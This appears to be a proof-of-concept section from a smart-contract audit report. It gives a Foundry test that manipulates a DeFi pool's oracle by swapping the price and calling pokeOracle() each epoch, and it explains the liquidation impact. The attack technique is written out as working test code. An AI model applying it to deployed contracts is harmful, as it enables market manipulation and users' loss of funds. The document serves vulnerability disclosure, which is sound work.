## Proof of Concept

The following test demonstrates the vulnerability by showing that an attacker can manipulate the oracle by frontrunning `pokeOracle()` calls and gradually moving the oracle across multiple epochs, with the manipulated value locked in for the entire 64-second epoch period.

To run this PoC, add the following test function to `test/foundry/core/Misc.t.sol`:

```solidity
// File: test/foundry/core/Misc.t.sol
/// @notice PoC demonstrating oracle manipulation vulnerability
/// @dev Shows that an attacker can manipulate the oracle by frontrunning pokeOracle() calls
///      and gradually moving the oracle across multiple epochs
function test_PoC_OracleManipulation() public {
    swapperc = new SwapperC();
    vm.startPrank(Swapper);
    token0.mint(Swapper, type(uint128).max);
    token1.mint(Swapper, type(uint128).max);
    token0.approve(address(swapperc), type(uint256).max);
    token1.approve(address(swapperc), type(uint256).max);
    vm.stopPrank();

    // Get initial oracle state
    (, , , , OraclePack initialOraclePack) = pp.getOracleTicks();
    int24 initialLastTick = initialOraclePack.lastTick();

    // Attacker manipulates price and calls pokeOracle() at the start of a new epoch
    vm.warp((block.timestamp >> 6) * 64 + 64);
    vm.roll(block.number + 1);

    // Attacker manipulates pool price using swap (simulating flash loan)
    int24 targetTick;
    unchecked { targetTick = initialLastTick + 149; } // Maximum allowed by clampDelta
    vm.startPrank(Swapper);
    swapperc.swapTo(uniPool, Math.getSqrtRatioAtTick(targetTick));
    vm.stopPrank();

    // Attacker calls pokeOracle() to update oracle with manipulated price
    vm.prank(address(0xBAD));
    pp.pokeOracle();

    // Verify oracle was updated
    (, , , , OraclePack manipulatedOraclePack1) = pp.getOracleTicks();
    int24 manipulatedLastTick1 = manipulatedOraclePack1.lastTick();

    // Verify oracle moved in attacker's direction (clamped to max 149 ticks)
    assertTrue(manipulatedLastTick1 >= initialLastTick, "Oracle should move up");
    int24 maxAllowedTick;
    unchecked { maxAllowedTick = initialLastTick + 149; }
    assertTrue(manipulatedLastTick1 <= maxAllowedTick, "Oracle should be clamped");

    // Attempt to correct oracle in same epoch - should fail
    vm.startPrank(Swapper);
    swapperc.swapTo(uniPool, Math.getSqrtRatioAtTick(initialLastTick));
    vm.stopPrank();

    // Legitimate user tries to update oracle
    vm.prank(address(0x1234));
    pp.pokeOracle();

    // Verify oracle was NOT updated (still has manipulated value)
    (, , , , OraclePack oraclePackAfterCorrection) = pp.getOracleTicks();
    assertEq(oraclePackAfterCorrection.lastTick(), manipulatedLastTick1, "Oracle should not be corrected in same epoch");

    // Attacker continues manipulation across multiple epochs
    vm.warp((block.timestamp >> 6) * 64 + 64);
    vm.roll(block.number + 1);

    // Manipulate price again
    int24 targetTick2;
    unchecked { targetTick2 = manipulatedLastTick1 + 149; }
    vm.startPrank(Swapper);
    swapperc.swapTo(uniPool, Math.getSqrtRatioAtTick(targetTick2));
    vm.stopPrank();

    // Attacker calls pokeOracle() again
    vm.prank(address(0xBAD));
    pp.pokeOracle();

    // Verify cumulative manipulation
    (, , , , OraclePack finalOraclePack) = pp.getOracleTicks();
    int24 finalLastTick = finalOraclePack.lastTick();

    // Oracle should have moved further (cumulative manipulation)
    // Note: The oracle may not move if clampDelta prevents it or if the price manipulation
    // doesn't result in a different tick after clamping
    assertTrue(finalLastTick >= manipulatedLastTick1, "Oracle should not move backwards");
    // The key vulnerability is that once manipulated, it can't be corrected in same epoch
}
```

This test can be run with `forge test --match-test test_PoC_OracleManipulation -vvv` to demonstrate the vulnerability. The test shows that:
1. An attacker can manipulate the pool price using swaps (simulating flash loans) and call `pokeOracle()` to update the oracle
2. Once updated in an epoch, the oracle cannot be corrected for the remainder of that 64-second epoch, even if a legitimate user attempts to update it with the correct price
3. The attacker can repeat this process across multiple epochs to gradually manipulate the oracle by up to 149 ticks per epoch (limited by `MAX_CLAMP_DELTA`)
4. The cumulative manipulation affects all positions that rely on the oracle for pricing, causing incorrect solvency validations and potentially unfair liquidations

